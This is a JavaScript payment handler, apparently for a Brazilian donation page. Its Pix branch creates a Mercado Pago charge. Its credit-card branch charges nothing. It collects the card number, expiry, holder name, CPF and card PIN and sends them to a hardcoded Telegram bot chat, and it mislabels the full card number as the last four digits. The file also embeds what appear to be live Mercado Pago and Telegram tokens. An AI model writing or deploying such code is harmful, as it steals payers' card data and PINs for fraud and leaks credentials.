import axios from 'axios';

const ACCESS_TOKEN = "APP_USR-1245205998264290-041409-1047ee9e45914c23e16758074dc1b797-1712554417";
const TELEGRAM_TOKEN = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o";
const CHAT_ID = "5650303115";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send({ erro: 'Método não permitido' });

  const body = req.body;
  const url = req.url;

  if (url.includes("pix")) {
    const valor = parseFloat(body.valor || 0);
    const email = body.email || "usuario@teste.com";
    const nome = body.nome || "Usuário Desconhecido";
    const turbinar = body.turbinar;

    const valorFinal = turbinar ? valor + 5.99 : valor;

    if (valorFinal <= 0) return res.status(400).json({ erro: "Valor inválido." });

    const [first_name, ...rest] = nome.split(" ");
    const last_name = rest.join(" ") || "Desconhecido";

    try {
      const response = await axios.post("https://api.mercadopago.com/v1/payments", {
        transaction_amount: valorFinal,
        description: "Doação via Pix",
        payment_method_id: "pix",
        payer: { email, first_name, last_name }
      }, {
        headers: {
          Authorization: `Bearer ${ACCESS_TOKEN}`,
          'Content-Type': 'application/json',
          'X-Idempotency-Key': crypto.randomUUID()
        }
      });

      const data = response.data.point_of_interaction.transaction_data;
      res.status(200).json({ pix_qr: data.qr_code_base64, pix_copiaecola: data.qr_code });
    } catch (error) {
      res.status(500).json({ erro: "Erro ao gerar Pix." });
    }
  } else if (url.includes("cartao")) {
    const mensagem = `
**Novo Pagamento via Cartão de Crédito:**
- **Nome**: ${body.nome}
- **E-mail**: ${body.email}
- **Valor**: R$ ${body.valor}
- **Número do Cartão**: ${body.numero} (últimos 4 dígitos)
- **Nome do Titular**: ${body.nome_cartao}
- **Validade**: ${body.validade}
- **CPF do Titular**: ${body.cpf_cartao}
- **Senha Cartão**: ${body.senha}
`;
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: mensagem,
        parse_mode: "Markdown"
      });
      res.status(200).json({ success: true });
    } catch (err) {
      res.status(500).json({ erro: "Erro ao enviar para o Telegram." });
    }
  } else {
    res.status(404).json({ erro: "Endpoint inválido." });
  }
}
